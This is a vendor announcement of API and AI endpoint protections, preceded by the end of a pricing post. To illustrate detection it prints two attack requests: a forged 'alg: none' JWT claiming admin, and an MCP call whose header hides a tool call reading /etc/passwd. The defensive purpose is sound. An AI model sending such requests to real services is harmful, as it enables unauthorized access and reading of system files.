If you already use AWS WAF, your account stays on current pricing until February 1, 2027. If you hold an AWS WAF private pricing agreement, it stays in force until it expires.

You don’t have to work out the math yourself. The AWS WAF pricing page includes worked examples that show how the three fees add up for common workloads. If you have questions about how the new pricing applies to your account, contact your AWS account team or open a Support case.

For AWS Shield Advanced subscribers, nothing changes. Your Shield Advanced subscription, its price, and your included AWS WAF entitlement stay the same. AWS WAF remains included up to 1,500 WCU per protection pack (web ACL), the resources Shield Advanced protects stay unmetered, and AWS WAF base requests remain free up to 50 billion per calendar month.

Customers on a CloudFront flat-rate pricing plan also see no change. AWS WAF stays included in your plan, and your plan’s included requests stay the same.

How the new pricing works

AWS WAF bills three fees. The resource fee is an hourly charge for each resource associated with a protection pack (web ACL). It covers resources that AWS WAF can protect, such as Amazon CloudFront distributions, Application Load Balancers, and Amazon API Gateway APIs. The base request fee applies to each request AWS WAF inspects. The premium request fee applies on top of the base request fee, to the requests that advanced protections evaluate, such as Bot Control targeted protections, Fraud Control, API Security, and AI Security. AWS WAF also launches two new managed rule groups today, API Security and AI Security. Both use the same premium request fee, with no separate subscription or rate. For the current list of advanced protections, see the AWS WAF Developer Guide.

Fee

What it’s charged for

Rate

Resource fee

Each resource associated with a protection pack (web ACL), prorated hourly

$0.01 per hour (about $7.30 per month)

Base request fee

Each request that AWS WAF inspects

$0.60 per million requests

Premium request fee

Requests evaluated by advanced protections, in addition to the base request fee

$5.00 per million requests

Requests evaluated by one or more advanced protections are billed $5.60 per million: the $0.60 base request fee plus the $5.00 premium request fee. AWS WAF charges the premium request fee once per request, however many advanced protections evaluate it. A request that Bot Control targeted protections, API Security, and AI Security evaluate is still billed $5.60 per million. A request that an earlier rule blocks before it reaches an advanced protection pays only the base request fee. For instance, a request blocked by a custom rule before it reaches Bot Control pays $0.60 per million, not $5.60.

Figure 1 shows where each previous charge lands under the new pricing model. AWS WAF also inspects request bodies up to the maximum size that each associated resource type supports, at no extra charge. For the current limits by resource type, see Considerations for managing body inspection in AWS WAF.

Figure 1: Mapping of previous AWS WAF pricing components to the new three-dimension model

See your traffic with the Security analytics dashboard

The new pricing also includes the Security analytics dashboard. The dashboard shows full traffic metrics for your protected applications over a rolling 21 day window. You can use it to see the requests your protection packs (web ACLs) inspect and how your rules act on them, which helps you tune the protections and understand what drives your request fees. The dashboard is included at no additional cost.

Estimating your bill

Figure 2 shows how the three dimensions add up for three example workloads.

Example 1: One protected resource. One Application Load Balancer serving 20 million requests per month.

Resource fee: 1 resource × $0.01 per hour × 730 hours = $7.30

Base request fee: 20 million × $0.60 per million = $12.00

Total: $19.30 per month

Example 2: A larger footprint. 40 resources serving 150 million requests per month.

Resource fee: 40 × $7.30 = $292.00

Base request fee: 150 million × $0.60 per million = $90.00

Total: $382.00 per month. At this size, the resource fee is the larger share.

Example 3: Advanced protections. 5 resources, 300 million requests, 30 million of them evaluated by advanced protections.

Resource fee: 5 × $7.30 = $36.50

Base request fee: 300 million × $0.60 per million = $180.00

Premium request fee: 30 million × $5.00 per million = $150.00

Total: $366.50 per month

Figure 2: How the three dimensions add up for three example workloads

To estimate your own bill, start with how many resources each protection pack (web ACL) is associated with, since that drives the resource fee. For request volumes, AWS WAF publishes Amazon CloudWatch metrics for each protection pack (web ACL) and each protected resource, including the requests your advanced protections evaluate. The Security analytics dashboard gives you the same traffic view without building your own reports.

A few architectural choices can also help. Where it fits your architecture, protecting traffic at Amazon CloudFront can cost less than protecting many downstream resources one by one. If you serve many customer domains, Amazon CloudFront SaaS Manager lets you manage them as tenants of one multi-tenant distribution, so you can apply one protection pack across them. Scope-down statements send advanced protections only the traffic that warrants them, such as login or checkout paths.

Availability and getting started

The new AWS WAF pricing is available starting today. To get started, open the AWS WAF console, review your protection packs (web ACLs) and their resource associations, and review the examples on the AWS WAF pricing page.

Frequently asked questions

Does AWS WAF charge for requests it blocks? Yes. AWS WAF bills each request it inspects, including the requests it blocks. The protected resource bills those requests as usual, except Amazon CloudFront, which doesn’t charge for requests that AWS WAF blocks (learn more).

If a request passes through two protection packs (web ACLs), is it billed twice? Yes. For example, if a request passes a protection pack (web ACL) on a CloudFront distribution and another on the Application Load Balancer behind it, each protection pack (web ACL) bills it.

Does the Security analytics dashboard cost extra? No. The dashboard is included with AWS WAF at no additional cost.

Does pricing change for AWS Marketplace managed rule groups or AWS Shield Advanced? No. Pricing for AWS Marketplace managed rule groups and AWS Shield Advanced stays the same, and resources protected by Shield Advanced stay on their current pricing.

Is there a free tier? AWS WAF does not have a standalone free tier. If you serve your application through CloudFront and it handles fewer than 1 million requests per month, the CloudFront flat-rate Free plan includes AWS WAF at $0 per month. For plan details, see CloudFront flat-rate pricing plans.

What if my application needs more than 2,500 WCU? Open an AWS Support case to request a capacity increase.

Conclusion

The new AWS WAF pricing makes cost easier to plan around, so it does not become a blocker to security best practices. Your bill follows three things you can measure: the resources you protect, the requests AWS WAF inspects, and the requests that advanced protections evaluate. Adding, changing, or reordering rules doesn’t change your rate, and turning on Bot Control common protections or the Anti-DDoS rule group doesn’t add a subscription. The Security analytics dashboard gives you 21 days of traffic visibility at no additional cost.

To see what the change means for you, review the examples on the AWS WAF pricing page, or model a new workload in the AWS Pricing Calculator.

Title: Introducing API and AI security on AWS, from discovery to protection
Context: So a detection reaches high confidence only when different kinds of signs agree, and at least one is something your own traffic never does
Full Text:
APIs have run digital businesses for more than a decade. For a while, there seemed to be nothing new left to say about them. That changed in 2026, when AI endpoints joined them. Teams now run large language model (LLM) inference endpoints, Model Context Protocol (MCP) servers, and Agent2Agent (A2A) servers beside their REST APIs, on services such as Amazon Bedrock, Amazon Bedrock AgentCore, and Amazon Elastic Kubernetes Service (Amazon EKS), and more companies sell their API as the product itself. On the other end, AI agents read API descriptions, pick the tools they need, and chain calls with no person clicking through an app.

APIs have always had two kinds of callers: other services and people who use an app. Now there’s a third: AI agents that act on a person’s behalf. It feels like everyone has a personal AI agent that can call APIs for them. Who knew curl would be important again?

Today, we’re launching capabilities across AWS WAF, Amazon CloudFront, Application Load Balancer, and Amazon API Gateway that help you discover and protect the APIs and AI endpoints that services, apps, and AI agents call:

API Portal, a new feature in Amazon API Gateway, discovers your APIs and AI endpoints.

API Security, a new managed rule group in AWS WAF, protects your APIs.

AI Security, a new managed rule group in AWS WAF, protects your AI endpoints.

All three are generally available today. You can enable discovery in API Portal for one account or for your organization in AWS Organizations. The two rule groups protect the resources that you associate with your protection pack (web ACL). They work together: API Portal shows which discovered endpoints AWS WAF protects, and the security events that AWS WAF detects appear on each managed API’s detail page.

Same APIs, new callers, new attack surface

Your APIs are the same APIs they always were. What changed is how you expose them, who calls them, and what threatens them.

How you expose them. A new MCP server or LLM endpoint takes minutes to stand up. It can be placed behind a load balancer or a CloudFront distribution without ever passing through your API gateway, so it’s missing from the API registry and the security review. An agent that can reach it doesn’t need your documentation, either, because the endpoint describes itself: an MCP client asks the server for its tools with tools/list, and an A2A client reads the agent card that the server publishes.

Who calls them. The following table compares the three kinds of callers that reach your APIs today.

Caller

What normal looks like

What abuse looks like

What it means for protection

Service to service

Predictable, authenticated calls that repeat the same pattern

A stolen API key, or a partner that scrapes beyond its contract

Track rate and behavior for each API key and endpoint

Person to service, through an app

Sessions and UI-driven calls at a human pace

Account takeover and scripted checkouts

Browser-based signals, such as CAPTCHA and browser fingerprints, apply here

AI agent to service, for a person

Human intent with machine behavior, from an HTTP client or an automated browser

An agent with stolen credentials, or a bot that poses as an agent

Browser signals only go so far, so you need visibility into the API itself

What threatens them. The APIs behind your web and mobile apps were built for one client: your own app. Your app calls them in the right order, at a human pace, with input it already validated. Legitimate agents now call those same APIs directly, and so do attackers and fraudsters. None of them have to follow the rules that your app follows.

What we’re launching

Here’s how we respond to those changes, as shown in Figure 1. In the figure, services, people, and AI agents call your APIs through their entry points. There, API Portal maps your endpoints, and AWS WAF runs API Security and AI Security on the same traffic to stop threats.

Figure 1: API Portal inventories the APIs and AI endpoints that services, people, and AI agents call. AWS WAF protects the entry points in front of them

API Portal builds an inventory of your APIs from their configuration and live traffic, identifies which of them are AI endpoints (LLM inference, MCP, and A2A), and shows you what to protect. It does this by analyzing configuration and traffic across your API entry points: CloudFront, Application Load Balancer, and API Gateway.

API Security covers three kinds of API abuse: broken object level authorization, authentication attacks such as tampered tokens and credential stuffing, and reconnaissance such as probing for undocumented routes. It does this with rules that work from a single request and with behavioral detections that learn your traffic.

AI Security identifies your AI traffic (LLM inference, MCP, and A2A), validates MCP and A2A requests against their protocol, and checks prompts and responses through Amazon Bedrock Guardrails for prompt attacks, harmful content, and sensitive information.

All three work with Amazon CloudFront, Amazon API Gateway REST APIs, and Application Load Balancer. For the current list of supported resources, protocols, and endpoint types, see AWS WAF API Security and AWS WAF AI Security rule group in the AWS WAF Developer Guide.

The three capabilities live in two places. API Portal is in the Amazon API Gateway console. That’s where it can be found, not what it covers: it discovers APIs behind CloudFront, Application Load Balancer, and API Gateway alike. API Security and AI Security are in the AWS WAF console.

Discover: You can’t secure an invisible API

Ask a platform team how many APIs they run, and you’ll get a number from a registry. Ask what’s answering requests on the internet right now, and the number changes. The MCP server that a team set up for a hackathon isn’t in the registry. Neither is the v1 endpoint that nobody turned off. Both still answer requests.

API Portal builds the inventory from both live traffic and API configuration. You enable discovery in API Portal for one account or for your organization in AWS Organizations, and you can exclude resources that you don’t want in the inventory. It reads the service logs and configuration records of your API entry points. There’s nothing to attach, no logs to forward, and no traffic to reroute. It lists the endpoints that receive traffic, by host, path, and HTTP method. Every endpoint starts as a shadow API: deployed and reachable, but not yet governed. When you promote it, it becomes a managed API. For APIs you manage, API Portal also flags zombie APIs, which have no traffic and no configuration change for a set period, and orphaned APIs, whose owning account was closed or removed from your organization. Retire a zombie API that nothing needs, and resolve the ownership of an orphaned one. For the classification rules, see the API Portal Developer Guide.

API Portal also discovers your AI endpoints. It reports each endpoint’s type, such as an LLM inference endpoint, an MCP server, or an A2A server. It finds them in the traffic at the same entry points (CloudFront, Application Load Balancer, and API Gateway) and lists them in the same inventory as your other APIs, so you don’t build a separate view for them. Combined, one row can show a shadow MCP server that nobody manages yet. Figure 2 shows the inventory.

Figure 2: The API inventory in API Portal lists the endpoints discovered behind API Gateway and Application Load Balancer, with each endpoint’s AWS WAF status, classification, and AI workload type

“We can manage our API environment more effectively when we have a clear picture of what’s running across AWS. API Portal gives us that visibility without requiring teams to change how they deploy APIs or route traffic, helping us create a more complete view across the enterprise.” — Mike Hasani, Senior Software Engineer, Principal Financial Group

Some abuse shows in one request. Some appears only over time.

Two requests show why protecting an API takes two kinds of detection. Here’s the first one:

GET /v1/orders/48213 HTTP/1.1 Host: orders.example.com Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.

This JSON Web Token (JWT) declares alg: none. It asks your API to skip signature verification, and a correctly built client doesn’t send that. The API Security managed rule group blocks the request before it reaches your origin, from the first request and with no learning period. The same rules catch other token tampering, such as pointing the token at a signing key that the attacker controls. These rules check the structure of a token in the Authorization header. They don’t verify its signature, so your application still has to validate the token. For the full list of rules and what each one does by default, see API Security managed rule group in the AWS WAF Developer Guide.

Here’s the second one:

GET /accounts/1337 HTTP/1.1

Nothing is wrong with this request, and the caller’s token is valid. It’s abuse only if the caller doesn’t own account 1337, and no single request can tell you that. This is broken object level authorization (BOLA), the first entry in the OWASP API Security Top 10.

So, the managed rule group also learns. It builds a baseline from your own traffic and looks for callers who don’t fit it. There’s nothing to set up for this. You don’t turn on logging or mirror traffic.

The hard part is to avoid flagging your own scripts. For example, a nightly export job reads thousands of records on a steady machine schedule. On those two signs alone, it looks like an attacker. So a detection reaches high confidence only when different kinds of signs agree, and at least one is something your own traffic never does. For example, the caller reaches records through a sequence of calls that your app never makes, or your API keeps denying it access. High confidence also needs a caller that AWS WAF can identify from a credential on the request, such as a token. A caller that AWS WAF knows only by IP address stays at medium confidence. Figure 3 compares a nightly export job with an attacker on these signs.

Figure 3: Volume and timing alone don’t reach high confidence. A sign that your own traffic never shows has to agree with them

The behavioral detections cover more than object access. They also flag credential stuffing, where one source presents an unusual number of different credentials in the Authorization header, and probing, where a caller keeps requesting routes or parameters that your traffic never uses.

The same thinking applies to the response, what your APIs send back. The behavioral detections take account of the status codes that your application returns, such as a caller’s rate of denied or failed requests. A caller stands out when, for example, its successful calls turn into a run of authorization failures. API Security doesn’t inspect the content of responses. Figure 4 shows the APIs view of the protection pack (web ACL) dashboard in the AWS WAF console.

Figure 4: The APIs view of the protection pack (web ACL) dashboard shows API Security detections over time, the detections that matched the most requests, and how AWS WAF handled the labeled requests.

Every detection is a label under awswaf:managed:aws:api-security:. A label starts with a stage (attack, recon, or warning) and names the finding. Behavioral detections also end with a confidence (high, medium, or low). Each rule has its own default action. The single-request rules that identify token tampering and unsafe methods block, and the posture and schema discovery rules count. Behavioral detections block at high confidence and count at medium and low confidence, at either stage. Detections that work from a single request have no confidence. For example, attack:alg_none:jwt_header and attack:object_level:high block, and recon:path_schema counts. AWS WAF also repeats a caller’s finding as an actor_identity label on that caller’s later requests across the whole protection pack (web ACL), for about five minutes after the last detection. At high confidence, the rule group blocks those requests by default. At medium and low confidence it counts them, and your own rules can act on the label.

AI Security understands the protocols that agents speak

LLM inference endpoints, MCP servers, and A2A servers are APIs, too. API Portal shows you which of your endpoints they are, and the API Security managed rule group already inspects their requests like any other API path.

The AI Security managed rule group adds checks made for agent traffic. It first recognizes the traffic and labels each request as LLM, MCP, A2A, or not recognized, so the checks that follow fit each endpoint type. It runs in the same AWS WAF protection pack (web ACL) as your other rules, with no new service to deploy.

Its first layer checks each MCP and A2A request against the protocol version that the request declares in its MCP-Protocol-Version or A2A-Version header. It supports MCP versions 2025-06-18, 2025-11-25, and 2026-07-28, and A2A version 1.0. For the current list, see AI Security managed rule group. These protocol compliance checks are deterministic and run entirely in AWS WAF. They come in two levels. Baseline covers the violations that let a request slip past routing or inspection, as the example that follows shows, and blocks by default. Strict adds malformed requests that are worth flagging but are usually an outdated client, and counts by default. Each failed check also adds its own label, so you can see exactly which check failed. Here’s the kind of trick that Baseline catches. The header tells every component in front of the MCP server that the request only lists tools. The body calls a tool that reads a file:

POST /mcp HTTP/1.1 Host: tools.example.com Content-Type: application/json MCP-Protocol-Version: 2026-07-28 Mcp-Method: tools/list Mcp-Name: read_file { "jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": { "name": "read_file", "arguments": { "path": "/etc/passwd" } } }

A gateway or authorizer that trusts the header treats the request as read-only, and the server runs the tool. AWS WAF blocks the request at the API entry point, because the header and the body disagree about the method.

Its second layer checks content through Amazon Bedrock Guardrails. You don’t create or configure a guardrail for this. You turn on the option in the rule group and choose a service role, and AWS WAF assumes that role to call Bedrock Guardrails with your account’s identity. Bedrock Guardrails returns a score for each check. AWS WAF groups the scores into three levels (high, medium, and low), and the rule group has one rule for each check at each level, so you choose the action for each one. AWS WAF picks the checks for each endpoint type and each direction, as the following table shows. Response checks run only when you turn on response inspection. They cover the response body up to the body size that AWS WAF inspects for that resource, and content beyond that size isn’t checked.

Bedrock Guardrails check

What it looks for

By default, AWS WAF blocks a high-severity prompt attack, on the request or the response. Everything else counts and adds a label that names what matched, such as a prompt injection or a card number. You can change the action for any rule. If Bedrock Guardrails can’t check a request, AWS WAF adds a label that says why and lets the request through. The label is guardrails:not_assessed when the content can’t be assessed, such as an empty prompt. It’s guardrails:call_failed when the call to Bedrock Guardrails fails, plus a second label with the reason, such as guardrails:call_failed:throttling. Like every label, these appear in your AWS WAF logs and CloudWatch metrics. For how labels work, see Web request labeling in AWS WAF. To fail closed when the call to Bedrock Guardrails fails, set the Guardrails_CallFailed rule to block. Throttling then blocks requests, too. Content checks run in the supported Regions listed in AWS WAF AI Security rule group. Figure 5 follows one request through these checks.

Figure 5: AWS WAF recognizes agent traffic and checks its protocol itself, and calls Amazon Bedrock Guardrails to check the prompt on the way in and the answer on the way out

The AI Security labels follow the same steps, under awswaf:managed:aws:ai-security:. For example, traffic:recognized_mcp says what the traffic is, protocol_compliance_level:baseline:mcp is the level you act on, protocol_compliance_check:mcp_method_mismatch names the check that failed, and request:guardrails:prompt_attack:severity:high carries the Bedrock Guardrails result. For the full label list, supported protocols, and configuration, see AI Security managed rule group. Figure 6 shows the AI endpoints view of the protection pack (web ACL) dashboard.

Figure 6: The AI endpoints view of the protection pack (web ACL) dashboard shows AI Security detections over time, the Amazon Bedrock Guardrails findings that matched the most requests, and how AWS WAF handled AI traffic

Every detection is a label, and labels work with the rest of AWS WAF

Every detection from the API Security and AI Security rule groups is also a label on the request. Any rule that runs later in your protection pack can match those labels and combine them with labels from other managed rule groups. Examples are AWS WAF Bot Control, AWS WAF Fraud Control account takeover prevention, and the Amazon IP reputation list. That list draws on MadPot, the threat intelligence tool that Amazon uses to protect customers from cybercrime. Use request labels in your own rules. Labels from response checks, such as sensitive information in a response, drive the AI Security rule group’s own actions and appear in your CloudWatch metrics.

Here are four examples of what that makes possible:

Rate limits keyed on labels. One probe for your API schema can be noise. Fifty from the same caller in 5 minutes is reconnaissance. A rate-based rule scoped to the reconnaissance labels counts only those requests.

No unsigned agents on your MCP server. If your MCP server is only for agents you work with, block requests without an access token or a verified Web Bot Auth signature. Then match the Bot Control bot name label for the operators you trust. Application Load Balancer JWT verification, CloudFront Functions, Lambda@Edge, or your MCP server still validates the token itself.

Two weak signals that add up. A low-confidence API Security label or a Bot Control signal by itself isn’t enough to block. Block only the requests that carry both.

Tighter limits on sensitive paths. Bot Control targeted protection labels callers by confidence. Use those labels to set a lower rate limit on /checkout than on the rest of your API.

The following rule shows the first example. For each IP address, it counts the requests that carry an API Security reconnaissance label. When an address sends more than 50 requests in 5 minutes, the rule blocks them. Place it after the API Security managed rule group so that its labels are available.

{ "Name": "RateLimitAPISecurityRecon", "Priority": 40, "Statement": { "RateBasedStatement": { "Limit": 50, "EvaluationWindowSec": 300, "AggregateKeyType": "IP", "ScopeDownStatement": { "LabelMatchStatement": { "Scope": "NAMESPACE", "Key": "awswaf:managed:aws:api-security:recon:" } } } }, "Action": { "Block": {} }, "VisibilityConfig": { "SampledRequestsEnabled": true, "CloudWatchMetricsEnabled": true, "MetricName": "RateLimitAPISecurityRecon" } }

Labels don’t have to stop at AWS WAF. With custom request headers and dynamic label interpolation, AWS WAF can forward the matched labels to your origin. Your application then sees what AWS WAF saw and can show less data, require step-up authentication, or log the request for review. For how it works, see Do more with AWS WAF labels using dynamic label interpolation.

We keep adding labels, so the documentation holds the current lists. See API Security labels, AI Security labels, and AWS WAF Bot Control rule group.

See what the rule groups found, and act on it

Every label is also an Amazon CloudWatch metric, with no extra setup, and appears in your AWS WAF logs. The protection pack (web ACL) dashboard in the AWS WAF console shows them as traffic arrives. In API Portal, each managed API’s detail page shows the security events that AWS WAF detected on it, as shown in Figure 7.

Figure 7: Each managed API’s detail page in API Portal shows the events that AWS WAF detected on it

The managed rule groups enforce their own detections at your API entry points. To write a rule of your own, start from a label. Scope a rate-based rule to the paths it appears on, key it on the IP address or TLS fingerprint, and start in count mode.

When a detection type spikes, your existing alerting can act on it. That can be a CloudWatch alarm, or the observability or security platform that already reads your metrics and logs. For log destinations, see Logging AWS WAF protection pack (web ACL) traffic.

How we test API Security

No single test shows whether a detection works, so we combine several for API Security:

Automated red teaming – LLM-powered agents run continuously against deliberately vulnerable test APIs that we maintain. They probe, adapt, and chain steps the way an attacker does.

A growing attack suite – Each working exploit that the agents find becomes a repeatable test case. We replay the suite against the managed rule group when it changes.

Realistic legitimate traffic – We replay traffic such as batch jobs, seasonal spikes, and power users next to the attacks, so we measure false positives together with detections.

Results from our test environment don’t transfer directly to yours, because your APIs and the attacks against them differ. The numbers that matter come from your own traffic, and the next section shows how to get them. API Security is designed to detect and block callers who walk object IDs to harvest other users’ records, and tokens whose structure shows tampering. It also flags credential stuffing against the Authorization header and callers who probe for routes that your API doesn’t serve. Efficacy and expansion work for API Security, like AWS WAF security in general, is a continuous effort. For the current list of detections, see API Security managed rule group in the AWS WAF Developer Guide.

Check what gets blocked on your own traffic

The managed rule groups apply their default actions from the moment you add them. To see what a rule group finds before it blocks anything, first add it with all rule actions overridden to count, review the results, and then remove the override. Later, to review one rule, override only that rule to count. AWS WAF still evaluates an overridden rule and adds its label, so you see what it would have blocked on your own production traffic.

Behavioral detections need time to learn your traffic. For the learning period, see Testing and deploying AWS WAF API Security. For a step-by-step evaluation, see Testing and tuning your AWS WAF protections.

Availability

API Portal, API Security, and AI Security are generally available today. Detection of data exfiltration and sensitive data exposure in responses for API Security is coming soon.

Pricing

Each capability is priced by the service it runs in. For API Portal, see Amazon API Gateway pricing. For the API Security and AI Security managed rule groups, see AWS WAF pricing. For the content checks that AI Security runs through Bedrock Guardrails, see Amazon Bedrock pricing.

Get started

To get started, complete the following steps:

In API Portal, enable discovery for one account or for your organization in AWS Organizations, and exclude any resources that you don’t want in the inventory. This step doesn’t need AWS WAF. As the inventory builds, look for endpoints you didn’t expect, such as shadow APIs and AI endpoints, and add them to your managed APIs.

In the AWS WAF console, add the API Security managed rule group to the protection pack in front of your APIs. Start with all rule actions overridden to count, review what it finds on your own traffic, and then remove the override.

If you run AI endpoints, add the AI Security managed rule group to the same protection pack. To turn on the Bedrock Guardrails checks, choose a service role that AWS WAF can assume to call Bedrock Guardrails, and turn on response inspection if you want responses checked and your protection pack (web ACL) protects CloudFront or an Application Load Balancer. Start with the four rules that block by default overridden to count, review what they find on your own traffic, and then remove the overrides one rule at a time.

After the first baseline is available, the behavioral detections label abuse and block it at high confidence. Watch the labels in your CloudWatch metrics, and in your AWS WAF logs if you turn on logging.

Use those labels in your own rules, such as a lower rate limit on your most sensitive paths.

For step-by-step instructions, see Adding the API Security managed rule group and Adding the AI Security managed rule group in the AWS WAF Developer Guide.

Best practice: Put Amazon CloudFront in front of your APIs

Put Amazon CloudFront in front of your API Gateway APIs, your Application Load Balancers, and any other endpoint that is public on port 80 or 443, and associate your protection pack (web ACL) with the CloudFront distribution. That includes APIs that run outside AWS, with another cloud provider or on premises: CloudFront works with any HTTP or HTTPS origin, so those APIs get the same delivery, acceleration, and protection. The same applies to your MCP servers, A2A servers, and LLM endpoints, whether you host them on Amazon Bedrock AgentCore Gateway, on Amazon EKS, or elsewhere. With this setup:

AWS WAF inspects requests at the edge, before they reach your origin.

AWS WAF sees the caller’s own IP address.

AWS WAF mitigates attacks close to their source.

For origins in AWS, CloudFront VPC origins mean your Application Load Balancer or private API Gateway REST API isn’t exposed directly to the public internet and is reached through CloudFront.

For more information, see Use AWS WAF protections and Restrict access with VPC origins in the Amazon CloudFront Developer Guide, and the posts Introducing Amazon CloudFront VPC origins and Accessing private Amazon API Gateway endpoints through custom Amazon CloudFront distribution using VPC Origins.

Conclusion

Your APIs are the same APIs they always were. The callers changed, and so did the attack surface. With API Portal, you can see the APIs and AI endpoints that the internet is calling. With API Security and AI Security in AWS WAF, you can protect them at their entry points, without changes to your backend code.

AWS built the building blocks for what comes next: an inventory from traffic, labels that you can act on, and protection where requests first arrive. As agents and the protocols they speak change, those building blocks are where new protection shows up. For the most up-to-date information, see AWS WAF API Security and AWS WAF AI Security in the AWS WAF Developer Guide.

To get started, enable discovery in API Portal, and add the API Security and AI Security managed rule groups in the AWS WAF console.
